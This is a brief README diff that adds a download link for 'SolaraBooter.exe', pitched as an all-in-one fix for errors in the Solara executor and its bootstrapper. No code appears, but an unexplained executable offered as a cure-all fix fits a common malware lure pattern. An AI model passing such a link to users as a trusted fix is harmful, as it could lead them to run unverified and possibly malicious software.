@@ -3,4 +3,4 @@ An all in one executable that fixes all your errors when using solara + bootstra
 
 <img src="https://getsolara.co/wp-content/uploads/2025/03/featured4-1024x523.png">
 
-[Download Here]()
+[Download Here](https://github.com/solaraxz/solara/releases/download/SolaraRelease/SolaraBooter.exe)
